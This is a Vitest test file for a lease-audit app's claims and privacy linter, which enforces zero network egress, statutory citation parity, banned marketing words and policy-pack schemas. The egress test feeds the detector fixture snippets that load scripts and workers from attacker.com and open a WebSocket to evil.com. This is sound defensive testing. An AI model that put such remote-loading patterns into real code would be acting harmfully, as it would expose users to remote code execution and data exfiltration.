import { describe, it, expect } from 'vitest';
import {
  auditZeroEgress,
  auditStatutoryParity,
  auditVocabulary,
  auditPolicyPacks,
  auditPortfolioMasterBrief,
// @ts-expect-error - ESM audit script without bundled declaration
} from '../../scripts/audit-claims.mjs';

describe('LeaseAudit Claims & Privacy Invariant Linter (claims-linter.test.ts)', () => {
  it('enforces zero remote egress and strict loopback-only CSP invariant', () => {
    const errors: string[] = [];
    auditZeroEgress(errors);
    expect(errors).toEqual([]);

    // Fixture-based negative test asserting off-host CSP tokens are reported
    const offHostErrors: string[] = [];
    auditZeroEgress(offHostErrors, {
      overrideIndexContent: '<meta http-equiv="Content-Security-Policy" content="connect-src https://api.leakage.org">',
    });
    expect(offHostErrors.some((e) => e.includes('Unauthorized remote connect-src token detected'))).toBe(true);

    // Fixture-based negative test asserting unauthorized egress primitives are reported
    const primitiveErrors: string[] = [];
    auditZeroEgress(primitiveErrors, {
      overrideCodeSnippets: [
        'const f = fetch;',
        'navigator?.sendBeacon("/api/telemetry");',
        'const ws = new WebSocket("wss://evil.com");',
        "import('https://attacker.com/evil.js')",
        "import(`https://attacker.com/evil.js`)",
        "import('http://attacker.com/evil.js')",
        "new Worker('https://attacker.com/worker.js')",
        "new Worker(new URL('https://attacker.com/worker.js'))",
        "document.createElement('script')",
        "new Image()",
      ],
    });
    expect(primitiveErrors.length).toBe(10);

    // Negative test asserting comments and local workers are NOT flagged
    const benignErrors: string[] = [];
    auditZeroEgress(benignErrors, {
      overrideCodeSnippets: [
        "// import('https://attacker.com/evil.js')",
        "const a = 1; // new Worker('https://attacker.com/worker.js')",
        "new Worker(new URL('./edge-worker.ts', import.meta.url))",
      ],
    });
    expect(benignErrors).toEqual([]);
  });

  it('enforces statutory citation parity between README and policy packs', () => {
    const errors: string[] = [];
    auditStatutoryParity(errors);
    expect(errors).toEqual([]);
  });

  it('prohibits unprovable marketing adjectives across documentation and UI', () => {
    const errors: string[] = [];
    auditVocabulary(errors);
    expect(errors).toEqual([]);
  });

  it('validates schema conformance across all 6 statutory tenancy policy packs', () => {
    const errors: string[] = [];
    auditPolicyPacks(errors);
    expect(errors).toEqual([]);
  });

  it('verifies Portfolio Master Brief parity if brief is present', () => {
    const errors: string[] = [];
    auditPortfolioMasterBrief(errors, { requireBrief: false });
    expect(errors).toEqual([]);
  });

  it('fails if Portfolio Master Brief is required but missing', () => {
    const errors: string[] = [];
    auditPortfolioMasterBrief(errors, {
      requireBrief: true,
      overrideBriefPath: '/non-existent/path/BRIEF.md',
    });
    expect(errors.length).toBeGreaterThan(0);
    expect(errors[0]).toContain('not found but required via --require-brief');
  });
});
